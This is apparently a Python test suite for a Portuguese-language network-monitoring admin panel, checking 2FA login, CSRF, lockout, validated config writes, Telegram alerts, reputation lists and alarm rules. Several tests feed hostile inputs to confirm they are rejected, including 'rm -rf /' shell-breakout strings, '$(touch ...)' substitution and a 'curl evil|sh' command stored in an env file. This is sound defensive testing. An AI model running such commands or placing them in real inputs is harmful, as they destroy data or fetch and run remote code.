"""Painel web: login com senha + 2FA, CSRF, bloqueio, gravacao validada das configuracoes."""
from datetime import datetime, timedelta, timezone
import json
import os
from pathlib import Path
import shutil
import subprocess
import tempfile
import time
import unittest
from unittest import mock

try:
    import flask  # noqa: F401
    HAVE_FLASK = True
except ImportError:
    HAVE_FLASK = False

from fmn_filters.admin import security
from fmn_filters.admin.config_store import ConfigStore, Paths, read_env, render_env

ROOT = Path(__file__).resolve().parent.parent
TOKEN = "123456:" + "A" * 35


class FakeStore:
    def __init__(self):
        self.rows, self.fail_log, self.audits, self.ifnames, self.next_id = {}, [], [], {}, 1

    def user(self, username=None, uid=None):
        for u in self.rows.values():
            if (username is not None and u["username"] == username) or (uid is not None and u["id"] == uid):
                return dict(u)
        return None

    def users(self):
        return [dict(u) for u in sorted(self.rows.values(), key=lambda u: u["username"])]

    def create_user(self, username, pw_hash, must_change=True):
        uid = self.next_id
        self.next_id += 1
        self.rows[uid] = {"id": uid, "username": username, "pw_hash": pw_hash, "totp_secret": None, "totp_enabled": 0,
                          "totp_last_step": -1, "must_change_password": int(must_change), "disabled": 0,
                          "created_at": None, "last_login": None}

    def set_password(self, uid, pw_hash, must_change=False):
        self.rows[uid].update(pw_hash=pw_hash, must_change_password=int(must_change))

    def set_totp(self, uid, secret, enabled):
        self.rows[uid].update(totp_secret=secret, totp_enabled=int(enabled), totp_last_step=-1)

    def use_totp_step(self, uid, step):
        if self.rows[uid]["totp_last_step"] >= step:
            return False
        self.rows[uid]["totp_last_step"] = step
        return True

    def set_disabled(self, uid, disabled):
        self.rows[uid]["disabled"] = int(disabled)

    def delete_user(self, uid):
        del self.rows[uid]

    def fail(self, ip, username):
        self.fail_log.append((ip, username))

    def fails(self, ip, username, minutes=15):
        return sum(1 for i, _ in self.fail_log if i == ip), sum(1 for _, u in self.fail_log if u == username)

    def clear_fails(self, username):
        self.fail_log = [f for f in self.fail_log if f[1] != username]

    def audit(self, username, ip, action, detail=""):
        self.audits.append((username, action, detail))

    def audit_list(self, limit=200):
        return [(None, u, "ip", a, d) for u, a, d in reversed(self.audits)][:limit]

    def interfaces(self):
        return sorted(self.ifnames.items())

    def seen_interfaces(self):
        return [(334, 9e9), (999, 1e6)]

    def upsert_interface(self, idx, name):
        self.ifnames[idx] = name

    def delete_interface(self, idx):
        self.ifnames.pop(idx, None)

    def health(self):
        return {"eventos_24h": 3}

    def recent_events(self, limit=15):
        return [(datetime(2026, 11, 1, 10, 0), "IN UDP volumetrico", "high", "in", "45.238.170.70", "100.64.64.9",
                 123456.0, 812.5)]

    def reputation_listings(self, active=True, days=7):
        if not active:
            return []
        detail = json.dumps({"suspeitos": [{"ip": "100.64.65.10", "fluxos": 42, "destinos": 300, "portas": "22"}],
                             "eventos": [], "portas_analisadas": [22]})
        return [{"entry": "45.238.170.70", "lista": "blocklist.de SSH", "categoria": "ataque/força bruta SSH",
                 "scope": "cgnat_pool", "pool": "NAT-POOL-08", "desde": datetime(2026, 11, 1), "visto": None,
                 "saiu": None, "remocao": "expira em 48 h", "detail": detail}]

    def reputation_sources(self):
        return [("blocklist_de_ssh", None, datetime(2026, 11, 1), 4911, 1, "ok", "")]

    saved = None

    def saved_filters(self):
        if self.saved is None:
            self.saved = [{"id": 1, "name": "Recebido: SYN", "expr": "@dst_rede and proto tcp and flags S",
                           "description": "", "category": "Recebido", "builtin": 1, "created_by": ""}]
        return list(self.saved)

    def save_filter(self, name, expr, description, user):
        self.saved_filters()
        self.saved.append({"id": len(self.saved) + 1, "name": name, "expr": expr, "description": description,
                           "category": "Meus filtros", "builtin": 0, "created_by": user})

    def delete_filter(self, fid):
        self.saved_filters()
        before = len(self.saved)
        self.saved = [x for x in self.saved if not (x["id"] == fid and not x["builtin"])]
        return before - len(self.saved)

    custs = None

    def customers(self):
        if self.custs is None:
            self.custs = {}
        return [dict(c) for c in self.custs.values()]

    def save_customer(self, cid, c, user):
        self.customers()
        if not cid and any(x["name"] == c["name"] for x in self.custs.values()):
            raise Exception("(1062, Duplicate entry)")
        cid = cid or len(self.custs) + 1
        self.custs[cid] = dict(c, id=cid, updated_by=user, updated_at=None)
        return cid

    def delete_customer(self, cid):
        return 1 if self.custs.pop(cid, None) else 0

    health_rows = None

    def health_items(self):
        return self.health_rows

    excs = None
    synced_ids = ()

    def exceptions(self):
        if self.excs is None:
            self.excs = []
        return [dict(e) for e in self.excs]

    def save_exception(self, e, user):
        self.exceptions()
        eid = len(self.excs) + 1
        self.excs.append(dict(e, id=eid, created_by=user, expires_at=None, prefixes=0, synced_at=None, sync_error=""))
        return eid

    def delete_exception(self, eid):
        before = len(self.exceptions())
        self.excs = [e for e in self.excs if e["id"] != eid]
        return before - len(self.excs)

    def sync_exception(self, eid):
        self.synced_ids = tuple(self.synced_ids) + (eid,)
        return "AS%s: 3 prefixos" % next(e["value"] for e in self.excs if e["id"] == eid)

    def baseline_table(self):
        out = {}
        for h in range(24):
            for dt in ("wkd", "wke"):
                out[("IN UDP volumetrico", "dedicated", dt, h, "min_pps")] = (2000.0 if h < 7 else 40000.0, 5)
                out[("IN UDP volumetrico", "dedicated", dt, h, "min_mbps")] = (20.0 if h < 7 else 300.0, 5)
        return out

    def filter_rule_usual(self, rid, minute, days):
        return []

    alarm_rules = None

    def filter_rules(self):
        if self.alarm_rules is None:
            self.alarm_rules = {1: {"id": 1, "name": "SYN flood recebido", "enabled": True, "severity": "high",
                                    "direction": "in", "expr": "@dst_rede and proto tcp and flags S and not flags A",
                                    "definition": {"logic": "and", "conditions": [
                                        {"metric": "pps", "op": "gt", "value": 20000}], "consecutive": 2,
                                        "resolve_after": 5, "report": {"agg": "dstip", "top": 5}, "notify": True,
                                        "retention_days": 7},
                                    "builtin": 1, "status": "open", "last_bucket": datetime(2026, 11, 1, 12),
                                    "last_bps": 8e6, "last_pps": 30000.0, "last_flows": 900.0, "last_error": None,
                                    "incidents_7d": 1}}
        return [dict(r) for r in self.alarm_rules.values()]

    def filter_rule(self, rid):
        self.filter_rules()
        r = self.alarm_rules.get(rid)
        return dict(r) if r else None

    def save_filter_rule(self, rid, name, enabled, severity, direction, expr, definition, user):
        self.filter_rules()
        rid = rid or max(self.alarm_rules) + 1
        base = self.alarm_rules.get(rid, {"builtin": 0, "status": None, "last_bucket": None, "last_bps": 0,
                                          "last_pps": 0, "last_flows": 0, "last_error": None, "incidents_7d": 0})
        base.update(id=rid, name=name, enabled=bool(enabled), severity=severity, direction=direction, expr=expr,
                    definition=definition, updated_by=user)
        self.alarm_rules[rid] = base
        return rid

    def set_filter_rule_enabled(self, rid, enabled):
        self.alarm_rules[rid]["enabled"] = bool(enabled)

    def delete_filter_rule(self, rid):
        self.alarm_rules.pop(rid, None)

    def filter_rule_samples(self, rid, hours=6):
        return [{"t": datetime(2026, 11, 1, 12, i), "bps": 1e6 * i, "pps": 100.0 * i, "flows": 10.0 * i,
                 "bpp": 500.0, "matched": i > 3} for i in range(6)]

    def filter_incidents(self, rid=None, limit=50):
        return [{"id": 1, "rule_id": 1, "rule_name": "SYN flood recebido", "severity": "high", "status": "open",
                 "started_at": datetime(2026, 11, 1, 12, 4), "last_match_at": datetime(2026, 11, 1, 12, 5),
                 "resolved_at": None, "peak_bps": 8e6, "peak_pps": 30000.0, "peak_flows": 900.0, "matches": 2,
                 "top": [{"key": "45.238.170.70", "bps": 7e6, "pps": 20000.0, "scope": "cgnat_pool",
                          "pool": "NAT-POOL-08", "assinantes": ["100.64.65.10"]}]}]

    synced = None

    def sync_prefixes(self, cfg, profile):
        from fmn_filters.net_prefixes import rows
        self.synced = rows(cfg, profile)
        return len(self.synced)

    def with_connection(self, fn):
        class Cur:
            def execute(self, sql, params=()):
                self.sql = sql

            def fetchall(self):
                return []

            def fetchone(self):
                return (None,)

        class Conn:
            def cursor(self):
                return Cur()
        return fn(Conn())


def make_tree(tmp: Path):
    """Arquivos como no servidor: links em /etc/orbymon apontando para managed/."""
    etc, managed, calib = tmp / "etc", tmp / "etc" / "managed", tmp / "calibration"
    managed.mkdir(parents=True)
    calib.mkdir()
    profile = json.loads((ROOT / "rules" / "cgnat-profiles.a10.json").read_text())
    (managed / "cgnat-profiles.json").write_text(json.dumps(profile))
    cfg = json.loads((ROOT / "rules" / "bidir.example.json").read_text())
    cfg["cgnat_profile_path"] = str(etc / "cgnat-profiles.json")
    (managed / "bidir.json").write_text(json.dumps(cfg))
    (managed / "telegram.env").write_text("TELEGRAM_BOT_TOKEN=%s\nTELEGRAM_CHAT_IDS=-1001\n" % TOKEN)
    (managed / "retention.env").write_text("ORBYMON_LOG_RETENTION_DAYS=15\nORBYMON_FLOW_RETENTION_DAYS=15\n")
    (managed / "reputation.env").write_text("ORBYMON_REP_DISABLED=''\nABUSEIPDB_API_KEY=''\n")
    (etc / "reputation.env").symlink_to(managed / "reputation.env")
    (tmp / "nat").mkdir()
    fixture = ROOT / "tests" / "fixtures" / "nfcapd.20261101120000"
    (tmp / "flows" / "huawei").mkdir(parents=True)
    import shutil as _sh, time as _t
    _sh.copy(fixture, tmp / "flows" / "huawei" / fixture.name)
    os.utime(tmp / "flows" / "huawei" / fixture.name, (_t.time() - 60, _t.time() - 60))
    for name in ("bidir.json", "cgnat-profiles.json", "telegram.env", "retention.env"):
        (etc / name).symlink_to(managed / name)
        os.chmod(managed / name, 0o640)
    return {"ORBYMON_ADMIN_TESTING": "1", "ORBYMON_CONFIG": str(etc / "bidir.json"),
            "ORBYMON_TELEGRAM_ENV": str(etc / "telegram.env"), "ORBYMON_RETENTION_ENV": str(etc / "retention.env"),
            "ORBYMON_CALIBRATION_DIR": str(calib), "ORBYMON_ADMIN_BACKUP_DIR": str(tmp / "backups"),
            "ORBYMON_REPUTATION_ENV": str(etc / "reputation.env"), "ORBYMON_RADIUS_ENV": str(etc / "radius.env"), "ORBYMON_NAT_DIR": str(tmp / "nat"),
            "ORBYMON_FLOW_ROOT": str(tmp / "flows"), "ORBYMON_QUERY_LOCK": str(tmp / "query.lock")}


class EnvFileTests(unittest.TestCase):
    def test_render_and_read_roundtrip(self):
        text = render_env({"A": "x y", "B": 5, "C": ""}, "teste")
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "f.env"
            p.write_text(text)
            self.assertEqual(read_env(p), {"A": "x y", "B": "5", "C": ""})

    def test_render_rejects_shell_breakout(self):
        for bad in ("a'; rm -rf /; '", "a\nB=1", "a\\"):
            with self.assertRaises(ValueError):
                render_env({"A": bad}, "teste")
        with self.assertRaises(ValueError):
            render_env({"lower": "x"}, "teste")

    def test_read_env_never_executes(self):
        with tempfile.TemporaryDirectory() as d:
            p, marker = Path(d) / "f.env", Path(d) / "pwned"
            p.write_text("X=$(touch %s)\n" % marker)
            self.assertEqual(read_env(p)["X"], "$(touch %s)" % marker)
            self.assertFalse(marker.exists())

    def test_notify_reads_env_file(self):
        from fmn_filters import notify_telegram
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "t.env"
            p.write_text(render_env({"TELEGRAM_BOT_TOKEN": TOKEN, "TELEGRAM_CHAT_IDS": "-100"}, "t"))
            sent = []

            class Fake:
                def __init__(self, token, chats):
                    sent.append((token, chats))

                def send(self, text):
                    sent.append(text)
            with mock.patch.object(notify_telegram, "Telegram", Fake):
                self.assertEqual(notify_telegram.main(["--env-file", str(p), "--test"]), 0)
            self.assertEqual(sent[0], (TOKEN, ["-100"]))


class ConfigStoreTests(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.env = make_tree(self.tmp)
        self.store = ConfigStore(Paths(self.env))

    def tearDown(self):
        shutil.rmtree(self.tmp)

    def test_write_follows_symlink_keeps_mode_and_backs_up(self):
        cfg = self.store.bidir()
        cfg["cooldown_minutes"] = 33
        self.store.save_bidir(cfg)
        link = Path(self.env["ORBYMON_CONFIG"])
        self.assertTrue(link.is_symlink())
        self.assertEqual(json.loads(link.read_text())["cooldown_minutes"], 33)
        self.assertEqual(os.stat(link).st_mode & 0o777, 0o640)
        self.assertEqual(len(list((self.tmp / "backups").glob("bidir.json.*"))), 1)

    def test_invalid_network_changes_nothing(self):
        cfg, prof = self.store.bidir(), self.store.profile()
        before = Path(self.env["ORBYMON_CONFIG"]).read_text()
        prof["cgnat_pools"].append("8.8.8.0/26")            # fora dos blocos protegidos
        with self.assertRaises(ValueError):
            self.store.save_network(cfg, prof)
        self.assertEqual(Path(self.env["ORBYMON_CONFIG"]).read_text(), before)

    def test_retention_never_writes_archive_command(self):
        Path(self.env["ORBYMON_RETENTION_ENV"]).write_text("ORBYMON_ARCHIVE_CMD=curl evil|sh\n")
        self.store.save_retention(7, 9)
        text = Path(self.env["ORBYMON_RETENTION_ENV"]).read_text()
        self.assertNotIn("ARCHIVE", text)
        self.assertEqual(read_env(Path(self.env["ORBYMON_RETENTION_ENV"]))["ORBYMON_LOG_RETENTION_DAYS"], "7")

    def test_apply_calibration_only_limits(self):
        cfg = self.store.bidir()
        proposal = json.loads(json.dumps(cfg))
        proposal["rules"][0]["limits"]["dedicated"]["min_pps"] = 77777
        proposal["rules"][0]["severity"] = "critical"          # nao deve ser aplicado
        proposal["cooldown_minutes"] = 1
        (Path(self.env["ORBYMON_CALIBRATION_DIR"]) / "bidir.proposed.json").write_text(json.dumps(proposal))
        changed = self.store.apply_calibration()
        new = self.store.bidir()
        self.assertEqual(new["rules"][0]["limits"]["dedicated"]["min_pps"], 77777)
        self.assertEqual(new["rules"][0]["severity"], cfg["rules"][0]["severity"])
        self.assertEqual(new["cooldown_minutes"], cfg["cooldown_minutes"])
        self.assertEqual(len(changed), 1)


@unittest.skipUnless(HAVE_FLASK, "flask nao instalado")
class PanelTests(unittest.TestCase):
    def setUp(self):
        from fmn_filters.admin.app import create_app
        self.tmp = Path(tempfile.mkdtemp())
        self.env = make_tree(self.tmp)
        self.db = FakeStore()
        self.db.create_user("admin", security.hash_password("senha-forte-123"), must_change=False)
        self.sent = []
        sent = self.sent

        class FakeTelegram:
            def __init__(self, token, chats):
                self.token = token

            def send(self, text):
                sent.append(text)

            def call(self, method, payload=None):
                return [{"message": {"chat": {"id": -1009, "title": "NOC"}}}]
        self.app = create_app(self.db, ConfigStore(Paths(self.env)), env=self.env, telegram_factory=FakeTelegram)
        self.c = self.app.test_client()

    def tearDown(self):
        shutil.rmtree(self.tmp)

    def csrf(self):
        self.c.get("/login")
        with self.c.session_transaction() as s:
            return s["csrf"]

    def post(self, url, **data):
        data["csrf"] = self.csrf()
        return self.c.post(url, data=data)

    def login(self, user="admin", password="senha-forte-123", now=None):
        r = self.post("/login", username=user, password=password)
        self.assertEqual(r.status_code, 302, r.data)
        u = self.db.user(username=user)
        if not u["totp_enabled"]:
            self.assertIn("/login/enroll", r.headers["Location"])
            page = self.c.get("/login/enroll")
            self.assertIn(b"data:image/svg+xml", page.data)
            with self.c.session_transaction() as s:
                secret = s["enroll_secret"]
            r = self.post("/login/enroll", code=security.totp_now(secret, now))
        else:
            r = self.post("/login/2fa", code=security.totp_now(u["totp_secret"], now))
        self.assertEqual(r.status_code, 302, r.data)
        self.assertTrue(r.headers["Location"].endswith("/"))
        return self.db.user(username=user)

    # ----- autenticacao
    def test_requires_login_and_sets_security_headers(self):
        r = self.c.get("/rede")
        self.assertEqual(r.status_code, 302)
        self.assertIn("/login", r.headers["Location"])
        r = self.c.get("/login")
        self.assertIn("script-src 'none'", r.headers["Content-Security-Policy"])
        self.assertEqual(r.headers["X-Frame-Options"], "DENY")

    def test_post_without_csrf_rejected(self):
        self.c.get("/login")
        r = self.c.post("/login", data={"username": "admin", "password": "senha-forte-123"})
        self.assertEqual(r.status_code, 400)

    def test_password_alone_is_not_enough(self):
        self.login()
        self.post("/logout")
        r = self.post("/login", username="admin", password="senha-forte-123")
        self.assertIn("/login/2fa", r.headers["Location"])
        self.assertEqual(self.c.get("/rede").status_code, 302)          # ainda sem acesso
        r = self.post("/login/2fa", code="000000")
        self.assertEqual(r.status_code, 401)

    def test_totp_code_cannot_be_reused(self):
        now = time.time()
        user = self.login(now=now)          # o codigo do passo atual foi usado na ativacao
        self.post("/logout")
        self.post("/login", username="admin", password="senha-forte-123")
        r = self.post("/login/2fa", code=security.totp_now(user["totp_secret"], now))
        self.assertEqual(r.status_code, 401)

    def test_lockout_after_failures(self):
        for _ in range(5):
            self.assertEqual(self.post("/login", username="admin", password="errada-errada").status_code, 401)
        r = self.post("/login", username="admin", password="senha-forte-123")
        self.assertEqual(r.status_code, 429)

    def test_unknown_user_same_answer(self):
        r = self.post("/login", username="naoexiste", password="qualquer-coisa")
        self.assertEqual(r.status_code, 401)
        self.assertIn("Usuário ou senha incorretos".encode(), r.data)

    def test_idle_timeout(self):
        self.login()
        with self.c.session_transaction() as s:
            s["seen"] = time.time() - 3600
        r = self.c.get("/")
        self.assertIn("/login", r.headers["Location"])

    def test_disabled_user_kicked_out(self):
        user = self.login()
        self.db.set_disabled(user["id"], True)
        self.assertEqual(self.c.get("/").status_code, 302)

    def test_must_change_password(self):
        self.db.create_user("novo", security.hash_password("provisoria-123"), must_change=True)
        self.login("novo", "provisoria-123")
        r = self.c.get("/rede")
        self.assertIn("/senha", r.headers["Location"])
        r = self.post("/senha", current="provisoria-123", new="nova-senha-segura", confirm="nova-senha-segura")
        self.assertEqual(r.status_code, 302)
        self.assertEqual(self.c.get("/rede").status_code, 200)

    # ----- paginas
    def test_status_page(self):
        self.login()
        with mock.patch("fmn_filters.admin.app.subprocess.run") as run:
            run.return_value = mock.Mock(stdout="active\n")
            r = self.c.get("/")
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"IN UDP volumetrico", r.data)
        self.assertIn(b"123.456", r.data)

    def test_network_save(self):
        self.login()
        r = self.post("/rede", provider_name="Provedor X", asns="AS262687, 64500",
                      protected_cidrs="187.87.201.0/24\n45.238.170.0/23",
                      ipv6_protected_cidrs="2804:4fa8::/32", inside_private_cidrs="100.64.64.0/19",
                      extra_infrastructure_cidrs="187.87.201.193/32", a10_sources="10.100.10.10",
                      pool_rows="2", pool_cidr_0="45.238.170.64/26", pool_name_0="NAT-POOL-08", pool_users_0="32",
                      pool_cidr_1="45.238.171.192/26", pool_name_1="NAT-POOL-12", pool_users_1="16")
        self.assertEqual(r.status_code, 302)
        cfg = json.loads(Path(self.env["ORBYMON_CONFIG"]).read_text())
        prof = json.loads(Path(cfg["cgnat_profile_path"]).read_text())
        self.assertEqual(cfg["asns"], [262687, 64500])
        self.assertEqual(cfg["provider_name"], "Provedor X")
        self.assertEqual(prof["cgnat_pools"], ["45.238.170.64/26", "45.238.171.192/26"])
        self.assertEqual(prof["cgnat_pool_metadata"]["45.238.171.192/26"]["max_users_per_ip"], 16)
        self.assertEqual(self.db.audits[-1][1], "rede_alterada")
        self.assertIn(("pool", "45.238.171.192/26", "NAT-POOL-12"), [r[:3] for r in self.db.synced])
        self.assertEqual(self.c.get("/rede").status_code, 200)

    def test_network_invalid_is_rejected(self):
        self.login()
        before = Path(self.env["ORBYMON_CONFIG"]).read_text()
        r = self.post("/rede", protected_cidrs="999.1.1.0/24", pool_rows="0")
        self.assertEqual(r.status_code, 302)
        self.assertEqual(Path(self.env["ORBYMON_CONFIG"]).read_text(), before)
        self.assertIn("Não salvo".encode(), self.c.get("/rede").data)

    def test_borders(self):
        self.login()
        self.post("/bordas", action="nome", if_index="334", if_name="Vlanif2511 (PTT)")
        self.assertEqual(self.db.ifnames[334], "Vlanif2511 (PTT)")
        page = self.c.get("/bordas")
        self.assertIn(b"Vlanif2511 (PTT)", page.data)
        self.post("/bordas", action="bordas", edge="334", extra_edges="412")
        cfg = json.loads(Path(self.env["ORBYMON_CONFIG"]).read_text())
        self.assertEqual(cfg["observation_ifindexes"], {"in": [334, 412], "out": [334, 412]})
        self.post("/bordas", action="nome", if_index="335", if_name="<script>")
        self.assertNotIn(335, self.db.ifnames)

    def test_rules_edit(self):
        self.login()
        cfg = json.loads(Path(self.env["ORBYMON_CONFIG"]).read_text())
        self.assertEqual(self.c.get("/regras").status_code, 200)
        data = {"cooldown_minutes": "20", "settle_minutes": "2"}
        for i, rule in enumerate(cfg["rules"]):
            if rule["enabled"]:
                data["r%d_enabled" % i] = "1"
            data["r%d_severity" % i] = rule["severity"]
            data["r%d_consecutive" % i] = str(rule["consecutive_minutes"])
        for i, rule in enumerate(cfg["nat_rules"]):
            data["n%d_enabled" % i] = "1" if rule["enabled"] else ""
            data["n%d_severity" % i] = rule["severity"]
        data["r0_dedicated_min_pps"] = "65000,5"
        self.post("/regras", **data)
        new = json.loads(Path(self.env["ORBYMON_CONFIG"]).read_text())
        self.assertEqual(new["rules"][0]["limits"]["dedicated"]["min_pps"], 65000.5)
        self.assertEqual(new["cooldown_minutes"], 20)
        self.assertIn("min_pps", self.db.audits[-1][2])

    def test_calibration_page_and_apply(self):
        self.login()
        cfg = json.loads(Path(self.env["ORBYMON_CONFIG"]).read_text())
        cfg["rules"][0]["limits"]["dedicated"]["min_pps"] = 1234
        calib = Path(self.env["ORBYMON_CALIBRATION_DIR"])
        (calib / "bidir.proposed.json").write_text(json.dumps(cfg))
        (calib / "relatorio-diario.json").write_text(json.dumps(
            {"periodo_utc": ["a", "b"], "minutos_com_dados": 1440, "fator": 2.0}))
        page = self.c.get("/regras")
        self.assertIn(b"1234", page.data)
        self.post("/regras", action="calibracao")
        new = json.loads(Path(self.env["ORBYMON_CONFIG"]).read_text())
        self.assertEqual(new["rules"][0]["limits"]["dedicated"]["min_pps"], 1234)

    def test_telegram_keeps_token_and_masks_it(self):
        self.login()
        page = self.c.get("/telegram")
        self.assertNotIn(TOKEN.encode(), page.data)
        self.assertIn(b"123456:", page.data)
        self.post("/telegram", token="", chats="-1001, -1002", min_severity="critical", reminder="30", close="20",
                  grafana_url="https://10.0.0.1:3000", site="POP Centro")
        values = read_env(Path(self.env["ORBYMON_TELEGRAM_ENV"]))
        self.assertEqual(values["TELEGRAM_BOT_TOKEN"], TOKEN)
        self.assertEqual(values["TELEGRAM_CHAT_IDS"], "-1001,-1002")
        self.assertNotIn(TOKEN, json.dumps(self.db.audits))           # token nunca na auditoria
        before = Path(self.env["ORBYMON_TELEGRAM_ENV"]).read_text()
        self.post("/telegram", token="", chats="-1001", min_severity="high", reminder="30", close="20",
                  site="x'; touch /tmp/x; '")
        self.assertEqual(Path(self.env["ORBYMON_TELEGRAM_ENV"]).read_text(), before)
        self.post("/telegram", action="teste")
        self.assertIn("Teste do painel", self.sent[-1])
        self.post("/telegram", action="chats")
        self.assertIn(b"-1009 (NOC)", self.c.get("/telegram").data)

    def test_retention(self):
        self.login()
        self.post("/retencao", log_days="7", flow_days="10")
        values = read_env(Path(self.env["ORBYMON_RETENTION_ENV"]))
        self.assertEqual(values, {"ORBYMON_LOG_RETENTION_DAYS": "7", "ORBYMON_FLOW_RETENTION_DAYS": "10"})

    def test_users(self):
        me = self.login()
        self.post("/usuarios", action="criar", username="operador", password="provisoria-1234")
        other = self.db.user(username="operador")
        self.assertTrue(other["must_change_password"])
        self.post("/usuarios", action="desativar", uid=str(me["id"]))
        self.assertFalse(self.db.user(uid=me["id"])["disabled"])
        self.db.set_totp(other["id"], "AAAA", True)
        self.post("/usuarios", action="reset2fa", uid=str(other["id"]))
        self.assertFalse(self.db.user(uid=other["id"])["totp_enabled"])
        self.post("/usuarios", action="excluir", uid=str(other["id"]))
        self.assertIsNone(self.db.user(username="operador"))
        self.assertEqual(self.c.get("/auditoria").status_code, 200)


    # ----- etapa 2
    def test_reputation_page_and_settings(self):
        self.login()
        page = self.c.get("/reputacao")
        self.assertEqual(page.status_code, 200)
        self.assertIn(b"100.64.65.10", page.data)
        self.assertIn(b"blocklist.de SSH", page.data)
        key = "a1" * 40
        self.post("/reputacao", src=["blocklist_de_ssh", "ipsum", "abuseipdb"], dnsbl="1", heavy_every_h="12",
                  abuseipdb_key=key)
        values = read_env(Path(self.env["ORBYMON_REPUTATION_ENV"]))
        self.assertEqual(values["ABUSEIPDB_API_KEY"], key)
        self.assertEqual(values["ORBYMON_REP_HEAVY_EVERY_H"], "12")
        self.assertIn("ciarmy", values["ORBYMON_REP_DISABLED"])
        self.assertNotIn("ipsum", values["ORBYMON_REP_DISABLED"])
        self.assertNotIn(key, json.dumps(self.db.audits))
        page = self.c.get("/reputacao")
        self.assertNotIn(key.encode(), page.data)
        self.post("/reputacao", src=["ipsum"], heavy_every_h="6", abuseipdb_key="")     # mantem a chave
        self.assertEqual(read_env(Path(self.env["ORBYMON_REPUTATION_ENV"]))["ABUSEIPDB_API_KEY"], key)
        self.post("/reputacao", src=["ipsum"], heavy_every_h="6", abuseipdb_key="x'; rm -rf /")
        self.assertEqual(read_env(Path(self.env["ORBYMON_REPUTATION_ENV"]))["ABUSEIPDB_API_KEY"], key)

    def test_investigate_with_port_and_email(self):
        from datetime import timezone as tzm
        nat = Path(self.env["ORBYMON_NAT_DIR"])
        ts = datetime(2026, 10, 30, 13, 50, tzinfo=tzm.utc).timestamp()
        (nat / "nat-events-2026103013.tsv").write_text(
            "%.3f\ta\ttcp\t100.64.65.10\t40001\t45.238.170.70\t51234\t%.3f\n" % (ts, ts))
        self.login()
        r = self.post("/investigar", ip="45.238.170.70", time="2026-10-30 10:55:01", tz="America/Sao_Paulo",
                      port="51234", window="10")
        self.assertEqual(r.status_code, 200)
        self.assertIn("Assinante identificado: 100.64.65.10".encode(), r.data)
        self.assertIn("confiança alta".encode(), r.data)
        email = "Date: Fri, 30 Oct 2026 15:00:00 +0100\n\nOct 30 14:55:01 h sshd[1]: Failed password for root " \
                "from 45.238.170.70 port 51234 ssh2\n"
        r = self.post("/investigar", email=email, tz="Europe/Berlin", window="10")
        self.assertIn("Assinante identificado: 100.64.65.10".encode(), r.data)
        self.assertEqual(self.db.audits[-1][1], "investigacao")
        r = self.post("/investigar", email="nada aqui 8.8.8.8", tz="UTC")
        self.assertIn("nenhum IP deste provedor".encode(), r.data)
        r = self.post("/investigar", ip="45.238.170.70", time="ontem", tz="UTC")
        self.assertIn("horário não reconhecido".encode(), r.data)

    def test_investigate_history(self):
        self.login()
        r = self.c.get("/investigar?ip=100.64.65.10")
        self.assertEqual(r.status_code, 200)
        self.assertIn("Histórico de 100.64.65.10".encode(), r.data)
        self.assertEqual(self.c.get("/investigar?ip=nao-e-ip").status_code, 200)


    @unittest.skipUnless(os.path.exists("/usr/bin/nfdump"), "nfdump ausente")
    def test_analysis_page(self):
        self.login()
        page = self.c.get("/analise")
        self.assertEqual(page.status_code, 200)
        self.assertIn(b"Recebido: SYN", page.data)
        r = self.post("/analise", expr="@dst_rede", mode="dstip", order="bytes", limit="10", period="60",
                      tz="UTC", action="executar")
        self.assertEqual(r.status_code, 200, r.data[:300])
        self.assertIn(b"45.238.170.70", r.data)
        self.assertIn(b"pool NAT-POOL-08", r.data)
        self.assertIn(b"Filtro executado", r.data)                   # atalho @dst_rede expandido
        self.assertEqual(self.db.audits[-1][1], "analise")
        r = self.post("/analise", expr="proto udp and dst port 0", mode="flows", order="bytes", limit="3",
                      period="60", tz="UTC", action="executar")
        self.assertIn("quem é?".encode(), r.data)
        r = self.post("/analise", expr="dst ip 1.2.3", mode="ip", period="60", action="executar")
        self.assertIn(b"incomplete IP", r.data)
        self.post("/analise", expr="@src_pools and dst port 25", name="Spam dos pools", action="salvar")
        mine = [x for x in self.db.saved if x["name"] == "Spam dos pools"][0]
        self.assertEqual(mine["created_by"], "admin")
        page = self.c.get("/analise?f=%d&run=1&period=60" % mine["id"])
        self.assertIn(b"@src_pools and dst port 25", page.data)
        self.post("/analise", fid=str(mine["id"]), action="excluir")
        self.assertFalse([x for x in self.db.saved if x["name"] == "Spam dos pools"])
        self.post("/analise", fid="1", action="excluir")                 # modelo pronto nao se exclui
        self.assertTrue([x for x in self.db.saved if x["id"] == 1])


    def test_alarm_pages(self):
        self.login()
        page = self.c.get("/alarmes")
        self.assertEqual(page.status_code, 200)
        for text in (b"SYN flood recebido", b"Incidente", b"NAT-POOL-08", b"100.64.65.10", b"pacotes/s &gt; 20000"):
            self.assertIn(text, page.data)
        page = self.c.get("/alarmes/1")
        self.assertEqual(page.status_code, 200)
        self.assertIn(b'class="hit"', page.data)                       # historico com minutos que casaram
        self.assertEqual(self.c.get("/alarmes/99").status_code, 404)
        form = dict(name="Flood no pool", severity="critical", direction="in", expr="@dst_rede", logic="and",
                    c0_metric="mbps", c0_op="gt", c0_value="5", c0_window="15",
                    c1_metric="flows", c1_op="above_avg", c1_value="", c1_window="15",
                    consecutive="2", resolve_after="3", agg="dstip", top="3", retention_days="7", notify="1")
        r = self.post("/alarmes/nova", action="testar", test_minutes="30", **form)
        self.assertEqual(r.status_code, 200, r.data[:300])
        self.assertIn("Teste com o tráfego real".encode(), r.data)
        self.assertEqual(len(self.db.alarm_rules), 1)                  # testar nao grava
        r = self.post("/alarmes/nova", action="usar_filtro", saved_id="1", **form)
        self.assertIn(b"flags S", r.data)
        bad = dict(form, c0_op="below_avg", c0_value="150")
        r = self.post("/alarmes/nova", action="salvar", **bad)
        self.assertIn(b'class="flash"', r.data)
        self.assertEqual(len(self.db.alarm_rules), 1)
        r = self.post("/alarmes/nova", action="salvar", **form)
        self.assertEqual(r.status_code, 302)
        new = self.db.alarm_rules[2]
        self.assertEqual((new["name"], new["enabled"], new["definition"]["conditions"][0]["value"]),
                         ("Flood no pool", False, 5.0))
        self.assertEqual(len(new["definition"]["conditions"]), 1)
        self.assertEqual(self.db.audits[-1][1], "alarme_salvo")
        self.post("/alarmes/2", action="ligar")
        self.assertTrue(self.db.alarm_rules[2]["enabled"])
        self.post("/alarmes/2", action="excluir")
        self.assertNotIn(2, self.db.alarm_rules)
        self.assertEqual(self.db.audits[-1][1], "alarme_excluido")
